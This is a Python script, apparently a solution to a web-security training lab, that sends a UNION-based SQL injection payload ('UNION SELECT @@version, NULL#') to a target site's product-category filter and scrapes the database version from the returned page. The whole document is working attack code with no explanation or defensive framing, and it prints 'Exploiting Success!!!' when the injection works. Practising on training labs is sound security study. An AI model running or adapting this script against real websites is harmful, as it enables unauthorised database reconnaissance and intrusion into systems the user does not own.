import requests
import argparse
from urllib.parse import urlparse
from urllib.parse import quote
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the target's URL (eg: http://example.com)")
arg = parser.parse_args()
input_url = arg.url

endpoint = "filter?category=Gifts"
payload = "' UNION SELECT @@version, NULL#"


def get_endpoint(url, endpoint):
    url_parse = urlparse(url)
    endpoint = f"{url_parse.scheme}://{url_parse.netloc}/{endpoint}"
    return endpoint


def exploit(url, endpoint, payload):
    endpoint = get_endpoint(url, endpoint)
    exploit = f"{endpoint}{payload}"
    encoded_exploit = quote(exploit, safe='://?=')
    try:
        response = requests.get(encoded_exploit)
        response.raise_for_status()
        return response
    except requests.exceptions.ConnectionError:
        print(f"Connection error occurred\nCheck again if the host is up!!!")
        return (None, None)
    except requests.exceptions.HTTPError as http_err:
        print(f"The host responsed with: {
              http_err}\nCheck again if the host is up!!!")
        return (None, None)


def fetch_db_version(url, endpoint, payload):
    try:
        exploit_response = exploit(url, endpoint, payload)
        soup = BeautifulSoup(exploit_response.text, "html.parser")
        th_tags = soup.find_all("th")
        cleaned_tags = [item.text.replace('\t', ' ') for item in th_tags]
        return [exploit_response.status_code, cleaned_tags[4]]
    except Exception:
        return (None, None)


def main():
    print("Exploiting target...")
    print("-"*50)
    response = fetch_db_version(input_url, endpoint, payload)
    try:
        if response[0] == 200:
            print(f"Endpoint: {get_endpoint(input_url, endpoint)}")
            print(f"Payload: {payload}")
            print(f"DB Version: {response[1]}")
            print("-"*50)
            print("Exploiting Success!!!")
        else:
            print("-"*50)
            print("Failed to exploit the target!!!")
    except Exception:
        print("-"*50)
        print("Failed to exploit the target!!!")


if __name__ == "__main__":
    main()
